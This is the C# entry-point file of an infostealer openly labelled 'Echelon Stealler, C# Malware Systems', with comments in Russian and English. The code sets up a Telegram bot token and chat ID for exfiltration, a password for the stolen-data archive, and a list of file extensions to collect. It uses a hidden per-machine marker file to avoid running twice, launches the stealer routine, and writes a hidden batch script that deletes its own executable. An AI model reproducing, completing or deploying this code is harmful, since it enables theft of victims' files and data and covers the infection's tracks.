///////////////////////////////////////////////////////
////Echelon Stealler, C# Malware Systems by MadСod ////
///////////////////Telegram: @madcod///////////////////
///////////////////////////////////////////////////////

using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;

namespace Echelon
{
    class Program
    {
        //Токен бота в телеге: 111094637203:AAFlY4YIiF0pNiC2ZzTD456456456xwnWIiX4M8
        public static string Token = "10409756726878952:AAGP4vSMC6u65ukboOxEo0Ab17DmZfghfaJGFztpQlk";

        // Your Telegram ID is 8443673005369:
        public static string ID = "8456574300569";

        // Пароль для архива с логом Echelon20:
        public static string passwordzip = "Echelon20";

        // 5500000 - 5 MB | 10500000 - 10 MB | 21000000 - 20 MB | 63000000 - 60 MB
        public static int FileSize = 10500000;

        // Список расширений для сбора (лимит веса файлов в GetFiles.cs)
        public static string[] Echelon_Size = new string[]
        {
          ".txt", ".rpd", ".suo", ".config", ".cs", ".csproj", ".tlp", ".sln",
        };

        [STAThread]
        private static void Main(string[] args)
        {
            if (File.Exists(Help.LocalData + "\\" + Help.HWID))
            {
                if (!File.ReadAllText(Help.LocalData + "\\" + Help.HWID).Contains(Help.HWID))
                {
                    // Запускаем стиллер
                    Stealer.GetStealer();
                }
                else
                {
                    Environment.Exit(0);
                }
            }

            else
            {
                Stealer.GetStealer();
                File.AppendAllText(Help.LocalData + "\\" + Help.HWID, Help.HWID);
                File.SetAttributes(Help.LocalData + "\\" + Help.HWID, FileAttributes.Hidden | FileAttributes.System);
            }

            // Самоудаление и добавление в планировщик задач с интервалом в 4 минуты
            string batch = Path.GetTempFileName() + ".bat";
            using (StreamWriter sw = new StreamWriter(batch))
            {
                sw.WriteLine("@echo off");
                sw.WriteLine("timeout 4 > NUL"); // Задержка до выполнения следуюющих команд
                sw.WriteLine("DEL " + "\"" + Path.GetFileName(new FileInfo(new Uri(Assembly.GetExecutingAssembly().CodeBase).LocalPath).Name) + "\"" + " /f /q"); // Удаляем исходный билд
            }

            Process.Start(new ProcessStartInfo()
            {
                FileName = batch,
                CreateNoWindow = true,
                ErrorDialog = false,
                UseShellExecute = false,
                WindowStyle = ProcessWindowStyle.Hidden
            });
            Environment.Exit(0);

        }
    }
}
